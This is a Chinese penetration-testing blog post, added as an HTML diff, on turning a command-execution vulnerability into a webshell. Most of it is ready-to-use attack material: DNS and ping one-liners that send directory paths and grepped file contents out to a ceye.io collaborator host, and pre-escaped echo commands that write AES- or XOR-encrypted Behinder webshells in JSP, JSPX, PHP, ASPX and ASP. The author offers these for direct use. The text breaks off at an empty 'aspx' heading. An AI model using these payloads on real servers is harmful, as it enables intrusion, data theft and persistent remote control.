@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="引言命令执行漏洞是渗透测试中很常见的漏洞之一，也是我们攻防演练或者安全测试中快速getshell的一种途径，当然，有时发现命令执行漏洞到成功getshell的过程可能注定不会太过容易，如常见的一些问题：目标机器不出网，执行命令无回显，盲注浪费时间，写shell容器路径找不到，写shell字符转义错误，上传shell文件被杀、下载wget等命令找不到等等。那都是一个悲伤的故事。这篇文章技术含量不是很">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A1LB1ue">
+<meta property="og:url" content="http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/index.html">
+<meta property="og:site_name" content="A1LB1ue">
+<meta property="og:description" content="引言命令执行漏洞是渗透测试中很常见的漏洞之一，也是我们攻防演练或者安全测试中快速getshell的一种途径，当然，有时发现命令执行漏洞到成功getshell的过程可能注定不会太过容易，如常见的一些问题：目标机器不出网，执行命令无回显，盲注浪费时间，写shell容器路径找不到，写shell字符转义错误，上传shell文件被杀、下载wget等命令找不到等等。那都是一个悲伤的故事。这篇文章技术含量不是很">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/RCE写shell姿势总结.assets/image-20211110234036047.png">
+<meta property="og:image" content="http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/RCE写shell姿势总结.assets/image-20211110234050159.png">
+<meta property="og:updated_time" content="2021-11-11T13:04:41.297Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="A1LB1ue">
+<meta name="twitter:description" content="引言命令执行漏洞是渗透测试中很常见的漏洞之一，也是我们攻防演练或者安全测试中快速getshell的一种途径，当然，有时发现命令执行漏洞到成功getshell的过程可能注定不会太过容易，如常见的一些问题：目标机器不出网，执行命令无回显，盲注浪费时间，写shell容器路径找不到，写shell字符转义错误，上传shell文件被杀、下载wget等命令找不到等等。那都是一个悲伤的故事。这篇文章技术含量不是很">
+<meta name="twitter:image" content="http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/RCE写shell姿势总结.assets/image-20211110234036047.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>A1LB1ue</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<script type="text/javascript" src="../source/js/love.js"></script>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/11/26/Windows命令行下常用渗透技巧/Windows命令行下常用渗透技巧/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/11/08/文件上传解析漏洞-解析、验证、伪造(二)/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找web路径"><span class="toc-number">2.</span> <span class="toc-text">寻找web路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件查找法"><span class="toc-number">2.1.</span> <span class="toc-text">1.文件查找法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-源码查找法"><span class="toc-number">2.2.</span> <span class="toc-text">2.源码查找法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-带外查找"><span class="toc-number">2.3.</span> <span class="toc-text">3.带外查找</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行系统命令写shell"><span class="toc-number">3.</span> <span class="toc-text">执行系统命令写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-直接写入法"><span class="toc-number">3.1.</span> <span class="toc-text">1.直接写入法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-转换法"><span class="toc-number">3.2.</span> <span class="toc-text">2.转换法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-二次法"><span class="toc-number">3.3.</span> <span class="toc-text">3.二次法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-远程下载法"><span class="toc-number">3.4.</span> <span class="toc-text">4.远程下载法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写："><span class="toc-number">3.5.</span> <span class="toc-text">遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">4.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#场景一"><span class="toc-number">4.1.</span> <span class="toc-text">场景一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景二"><span class="toc-number">4.2.</span> <span class="toc-text">场景二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景三"><span class="toc-number">4.3.</span> <span class="toc-text">场景三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景四"><span class="toc-number">4.4.</span> <span class="toc-text">场景四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">5.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#场景一-1"><span class="toc-number">5.1.</span> <span class="toc-text">场景一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景二-1"><span class="toc-number">5.2.</span> <span class="toc-text">场景二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景三-1"><span class="toc-number">5.3.</span> <span class="toc-text">场景三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景四-1"><span class="toc-number">5.4.</span> <span class="toc-text">场景四</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certutil编码上传Webshell"><span class="toc-number">5.5.</span> <span class="toc-text">Certutil编码上传Webshell</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-2"><span class="toc-number"></span> <span class="toc-text">Tips-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-3"><span class="toc-number"></span> <span class="toc-text">Tips-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-4"><span class="toc-number"></span> <span class="toc-text">Tips-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux查找某个文件并写入个新文件"><span class="toc-number">1.</span> <span class="toc-text">linux查找某个文件并写入个新文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux下base64编码写shell"><span class="toc-number"></span> <span class="toc-text">linux下base64编码写shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux下base64命令加解密"><span class="toc-number"></span> <span class="toc-text">linux下base64命令加解密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-查找某个文件并写入个新文件"><span class="toc-number"></span> <span class="toc-text">windows 查找某个文件并写入个新文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一步"><span class="toc-number"></span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#先查找c盘上所有叫-1-jpg-的文件，然后把base64编码内容写入到-base64-hm-test-txt-文件里面"><span class="toc-number"></span> <span class="toc-text">先查找c盘上所有叫 1.jpg 的文件，然后把base64编码内容写入到 base64-hm-test.txt 文件里面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二步"><span class="toc-number"></span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#在找到第一步写入的文件，进行base64解码以后进行二次写马"><span class="toc-number"></span> <span class="toc-text">在找到第一步写入的文件，进行base64解码以后进行二次写马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-base64编码写shell"><span class="toc-number"></span> <span class="toc-text">windows base64编码写shell</span></a>
+    </li></div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-10T08:22:33.986Z" itemprop="datePublished">2021-11-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>命令执行漏洞是渗透测试中很常见的漏洞之一，也是我们攻防演练或者安全测试中快速getshell的一种途径，当然，有时发现命令执行漏洞到成功getshell的过程可能注定不会太过容易，如常见的一些问题：目标机器不出网，执行命令无回显，盲注浪费时间，写shell容器路径找不到，写shell字符转义错误，上传shell文件被杀、下载wget等命令找不到等等。那都是一个悲伤的故事。这篇文章技术含量不是很高，但我想应该能帮助不少人。</p>
+<h2 id="寻找web路径"><a href="#寻找web路径" class="headerlink" title="寻找web路径"></a>寻找web路径</h2><p>想要写文件(webshell)，首先要找到web容器的根目录，下面是总结的一些寻找web目录的方法。</p>
+<h3 id="1-文件查找法"><a href="#1-文件查找法" class="headerlink" title="1.文件查找法"></a>1.文件查找法</h3><p><strong>（a）Windows</strong></p>
+<p>对于Windows查找文件方法，我收集了三种，其中前两种可以指定目录，而最后一种则是从当前目录搜索文件。三者都带有通配符，以下是搜索文件名中带有login的文件。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r C: %i <span class="keyword">in</span> (login.*) <span class="keyword">do</span> @echo %i</span><br><span class="line">where /R C: login.*</span><br><span class="line">dir /s/a<span class="literal">-d</span>/b login.*</span><br></pre></td></tr></table></figure>
+<p><strong>（b）Linux</strong></p>
+<p>对于Linux查找文件方法,我收集了两种，其中find是我们最常使用的，locate需要更新数据库，使用相对麻烦，部分系统可能不会携带此命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name "index.php"</span><br><span class="line">find / -name login.php</span><br><span class="line">updatedb &amp;&amp; locate index.php</span><br></pre></td></tr></table></figure>
+<h3 id="2-源码查找法"><a href="#2-源码查找法" class="headerlink" title="2.源码查找法"></a>2.源码查找法</h3><p><strong>（a）Windows</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /s /i /n /d:C:\ /c:&quot;123123&quot; *.txt</span><br></pre></td></tr></table></figure>
+<p>其中/d:是指定目录，在windows中一般为指定盘符，/c:则是指定文件内容，最后指定的是文件名字。</p>
+<p><strong>（b）Linux</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;</span><br></pre></td></tr></table></figure>
+<p>相信linux我们都很熟悉，这里不过多说明。</p>
+<h3 id="3-带外查找"><a href="#3-带外查找" class="headerlink" title="3.带外查找"></a>3.带外查找</h3><p>对于一些无回显的命令执行，或者盲注浪费时间的洞，我们可能需要协助OOB。</p>
+<p><strong>（a）Windows</strong></p>
+<p>在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后通过certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io</span><br></pre></td></tr></table></figure>
+<p>下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt)</span><br></pre></td></tr></table></figure>
+<p>为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io</span><br></pre></td></tr></table></figure>
+<p>如果需要外带多行命令，则需要以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&apos; &apos;,&apos;&apos;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&apos;.&apos;+$i+&apos;.is1lv6.ceye.io&apos;;$j += 1; nslookup $fin &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>（b）Linux</strong></p>
+<p>在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping pwd|tr -d &apos;\n&apos;|xxd -ps.is1lv6.ceye.io</span><br></pre></td></tr></table></figure>
+<p>base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io</span><br></pre></td></tr></table></figure>
+<p>如果有多行数据需要外带，那么请考虑下面的语句。（和大佬学的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done</span><br></pre></td></tr></table></figure>
+<p>oob主要参考一位大佬文章，会在文末列出。</p>
+<h2 id="执行系统命令写shell"><a href="#执行系统命令写shell" class="headerlink" title="执行系统命令写shell"></a>执行系统命令写shell</h2><p>通过上面的几种方法，感觉找个目录不在话下。（如果是站库分离，当我没说）<br>下面总结的是文件写入方法。</p>
+<h3 id="1-直接写入法"><a href="#1-直接写入法" class="headerlink" title="1.直接写入法"></a>1.直接写入法</h3><p><strong>（a）Windows</strong></p>
+<p>在windows主要的写入方法，我主要用以下两种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set /p=要写的内容&lt;nul &gt; C:\11.txt</span><br><span class="line">echo 要写的内容 &gt; C:\11.txt</span><br></pre></td></tr></table></figure>
+<p>在<strong>windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”</strong></p>
+<p>下面以echo为例，写入冰蝎各脚本语言shell，<strong>其中需要转义的东西，我已经帮各位表哥转过了，拿来直接用即可：</strong></p>
+<p><strong>（1）jsp</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if (request.getMethod().equals("POST"))&#123;String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%^&gt; &gt; 111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（2）jspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;^&gt;^&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/^&gt;^&lt;jsp:declaration^&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;^&lt;/jsp:declaration^&gt;^&lt;jsp:scriptlet^&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);^&lt;/jsp:scriptlet^&gt;^&lt;/jsp:root^&gt; &gt; 111.jspx</span><br></pre></td></tr></table></figure>
+<p><strong>（3）php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&apos;k&apos;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&apos;openssl&apos;))^&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i^&lt;strlen($post);$i++) ^&#123;$post[$i] = $post[$i]^^$key[$i+1^&amp;15]; ^&#125;^&#125;else^&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);^&#125;$arr=explode(&apos;^|&apos;,$post);$func=$arr[0];$params=$arr[1];class C^&#123;public function __invoke($p) ^&#123;eval($p.&quot;&quot;);^&#125;^&#125;@call_user_func(new C(),$params);?^&gt; &gt; 111.php</span><br></pre></td></tr></table></figure>
+<p><strong>（4）java9 jsp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;; session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%^&gt; &gt; 111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（5）aspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%@ Page Language=&quot;C#&quot; %^&gt;^&lt;%@Import Namespace=&quot;System.Reflection&quot;%^&gt;^&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;); byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%^&gt; &gt; 111.aspx</span><br></pre></td></tr></table></figure>
+<p><strong>（6）asp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;% &gt;&gt; 111.asp&amp;echo Response.CharSet = &quot;UTF-8&quot; &gt;&gt; 111.asp&amp;echo k=&quot;e45e329feb5d925b&quot; &gt;&gt; 111.asp&amp;echo Session(&quot;k&quot;)=k &gt;&gt; 111.asp&amp;echo size=Request.TotalBytes &gt;&gt; 111.asp&amp;echo content=Request.BinaryRead(size) &gt;&gt; 111.asp&amp;echo For i=1 To size &gt;&gt; 111.asp&amp;echo result=result^&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) &gt;&gt; 111.asp&amp;echo Next &gt;&gt; 111.asp&amp;echo execute(result) &gt;&gt; 111.asp&amp;echo %^&gt; &gt;&gt; 111.asp</span><br></pre></td></tr></table></figure>
+<p><strong>（b）Linux</strong></p>
+<p>在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。</p>
+<p><strong>（1）jsp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&apos; &gt; 111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（2）jspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;&apos; &gt; 111.jspx</span><br></pre></td></tr></table></figure>
+<p><strong>（3）php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[\047k\047]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(\047openssl\047))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++) &#123;$post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125;&#125;else&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);&#125;$arr=explode(\047|\047,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt; &apos; &gt; 111.php</span><br></pre></td></tr></table></figure>
+<p><strong>（4）aspx</strong></p>
